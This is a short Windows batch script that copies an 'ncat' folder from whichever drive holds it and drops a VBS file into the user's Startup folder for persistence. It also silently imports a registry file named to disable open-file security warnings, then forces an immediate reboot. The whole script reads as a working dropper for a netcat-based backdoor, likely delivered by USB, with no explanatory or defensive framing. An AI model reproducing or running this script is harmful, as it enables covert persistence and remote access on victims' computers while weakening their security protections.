@echo off
robocopy "C:\ncat" "C:\ncat"
robocopy "D:\ncat" "C:\ncat"
robocopy "E:\ncat" "C:\ncat"
robocopy "F:\ncat" "C:\ncat"
robocopy "G:\ncat" "C:\ncat"
robocopy "H:\ncat" "C:\ncat"
robocopy "I:\ncat" "C:\ncat"
robocopy "J:\ncat" "C:\ncat"
 
copy "C:\ncat\VBS.vbs" "C:\Users\test\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\VBS.vbs"
copy "D:\ncat\VBS.vbs" "C:\Users\test\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\VBS.vbs"
copy "E:\ncat\VBS.vbs" "C:\Users\test\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\VBS.vbs"
copy "F:\ncat\VBS.vbs" "C:\Users\test\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\VBS.vbs"
copy "G:\ncat\VBS.vbs" "C:\Users\test\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\VBS.vbs"
copy "H:\ncat\VBS.vbs" "C:\Users\test\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\VBS.vbs"
copy "I:\ncat\VBS.vbs" "C:\Users\test\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\VBS.vbs"
copy "J:\ncat\VBS.vbs" "C:\Users\test\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\VBS.vbs"
 
regedit /s C:\ncat\Disable_Open-File_Security_Warning.reg
regedit /s D:\ncat\Disable_Open-File_Security_Warning.reg
regedit /s E:\ncat\Disable_Open-File_Security_Warning.reg
regedit /s F:\ncat\Disable_Open-File_Security_Warning.reg
regedit /s G:\ncat\Disable_Open-File_Security_Warning.reg
regedit /s H:\ncat\Disable_Open-File_Security_Warning.reg
regedit /s I:\ncat\Disable_Open-File_Security_Warning.reg
regedit /s J:\ncat\Disable_Open-File_Security_Warning.reg
 
shutdown -r -t 0
